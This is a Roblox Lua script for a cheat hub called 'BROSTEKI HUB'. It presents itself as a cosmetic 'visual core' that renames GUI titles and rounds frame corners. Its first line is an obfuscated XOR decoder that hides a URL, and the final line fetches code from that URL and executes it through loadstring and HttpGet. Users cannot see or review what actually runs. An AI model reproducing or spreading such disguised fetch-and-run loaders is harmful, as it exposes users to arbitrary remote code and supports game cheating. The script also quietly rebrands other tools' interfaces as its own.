
--[[ STAGE 2: VISUAL CORE ]]
local uO4MZV2sHqbtWa3n3="\244\229\234\235\237\059\083\088\002\024\015\109\041\052\038\063\047\063\057\056\083\067\087\104\110\093\113\125\108\199\127\144\151\218\160\164\170\164\181\178\191\184\200\176\204\022\208\197\227\222\235\220\239\001\006\072\015\008\021\029\097\060\021\027\053\124\069\046\067\050\062\104\117\108\133\124\117\108\121\131\133\111\159\155\151\152\151\162\189\182\183\166\166\186\197\224\000\208\014\011\024\018\233\038\062\005\241\002"local rikrKkb9SUTkgx=115 local YAMA_6Thr9DgDWTUU1EcE=198 local HgZ1xTSmPSaldSt8WSs=0 local R6YcnWkN7cej6=5 local cRnSOPwVIbaw87L8N=14 local FjeYFKem_Evc8ra=false local ooIQzqWanh4RrFdS=bit32 and bit32.bxor if not ooIQzqWanh4RrFdS then ooIQzqWanh4RrFdS=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local I6sovDUQWEpbfA={}for K78dthM8KxVrdR6GSl85bC=1,#uO4MZV2sHqbtWa3n3 do local AsO1Othy2Jlj=string.byte(uO4MZV2sHqbtWa3n3,K78dthM8KxVrdR6GSl85bC)local M7WWKFr6TYP71=(YAMA_6Thr9DgDWTUU1EcE+(K78dthM8KxVrdR6GSl85bC*R6YcnWkN7cej6)+cRnSOPwVIbaw87L8N)%256 if HgZ1xTSmPSaldSt8WSs==0 then AsO1Othy2Jlj=(AsO1Othy2Jlj-M7WWKFr6TYP71)%256 I6sovDUQWEpbfA[K78dthM8KxVrdR6GSl85bC]=string.char(ooIQzqWanh4RrFdS(AsO1Othy2Jlj,rikrKkb9SUTkgx))else AsO1Othy2Jlj=ooIQzqWanh4RrFdS(AsO1Othy2Jlj,rikrKkb9SUTkgx)I6sovDUQWEpbfA[K78dthM8KxVrdR6GSl85bC]=string.char((AsO1Othy2Jlj-M7WWKFr6TYP71)%256)end end local b_msfjKftYGlNZI8ftqKCA=table.concat(I6sovDUQWEpbfA)if FjeYFKem_Evc8ra then b_msfjKftYGlNZI8ftqKCA=string.reverse(b_msfjKftYGlNZI8ftqKCA)end local B0Uvu3oxQfwkHGOr3w=b_msfjKftYGlNZI8ftqKCA
local HubName = "BROSTEKI HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(B0Uvu3oxQfwkHGOr3w))()
